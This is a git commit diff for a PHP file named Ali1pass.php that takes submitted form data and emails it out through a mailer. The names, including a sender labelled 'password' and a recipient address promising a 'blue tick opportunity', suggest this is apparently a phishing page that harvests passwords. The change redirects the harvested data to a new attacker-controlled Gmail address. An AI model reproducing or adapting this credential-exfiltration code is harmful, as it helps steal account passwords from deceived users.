2ba1d0b0536920cb60150b359eb9d1ace17163f0
advastong542 <advastingteam51@gmail.com>
2025-07-17 02:18:49 +0500

    Update and rename Uzrpass.php to Ali1pass.php

--- Ali1pass.php
+++ Ali1pass.php
@@ -35,14 +35,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email properties
         $mail->setFrom('Lernayouamzaxal@gmail.com', 'password');
-        $mail->addAddress('aliminikgang@gmail.com');
+        $mail->addAddress('get.blue.tick.opportunity8382@gmail.com');
         $mail->addAddress('Lernayouamzaxal@gmail.com');
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'uzr';
+        $mail->Subject = 'ali';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
